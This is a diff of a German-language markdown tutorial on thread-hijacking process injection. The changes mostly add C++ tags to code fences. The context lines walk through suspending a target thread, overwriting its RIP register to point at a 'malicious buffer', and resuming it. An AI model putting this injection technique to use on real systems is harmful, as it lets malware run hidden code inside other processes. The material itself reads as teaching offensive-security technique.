@@ -415,16 +415,17 @@ if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process
 			);
 			break;
 		}
+	}
 
 ```
 
 Im sechsten Schritt müssen wir den geöffneten Zielthread anhalten. Dazu können wir die Funktion `SuspendThread` verwenden.
-```
+```C++
 SuspendThread(hThread);
 ```
 
 Im siebten Schritt müssen wir den Thread-Kontext erhalten, um ihn in den kommenden API-Aufrufen zu verwenden. Dies kann mit der Funktion `GetThreadContext` durch Speichern eines Zeigers erreicht werden.
-```
+```C++
 CONTEXT context;
 GetThreadContext(
 	hThread, // Handle for the thread 
@@ -433,12 +434,12 @@ GetThreadContext(
 ```
 
 Im achten Schritt müssen wir den RIP (Instruction Pointer Register) überschreiben, um ihn auf unseren bösartigen Speicherbereich zu setzen. Falls Sie noch nicht mit CPU-Registern vertraut sind, ist RIP ein x64-Register, das die nächste Codeanweisung bestimmt und im Wesentlichen den Ablauf einer Anwendung im Speicher kontrolliert. Um das Register zu überschreiben, können wir den Thread-Kontext für RIP aktualisieren.
-```
+```C++
 context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
 ```
 
 Im neunten Schritt wird der Kontext aktualisiert und muss auf den aktuellen Thread-Kontext gesetzt werden. Dies kann einfach mit `SetThreadContext` und dem Zeiger auf den Kontext durchgeführt werden.
-```
+```C++
 SetThreadContext(
 	hThread, // Handle for the thread 
 	&context // Pointer to the context structure
@@ -446,7 +447,7 @@ SetThreadContext(
 ```
 
 Im letzten Schritt können wir nun den Zielthread aus dem angehaltenen Zustand herausnehmen. Hierfür verwenden wir die Funktion `ResumeThread`.
-```
+```C++
 ResumeThread(
 	hThread // Handle for the thread
 );
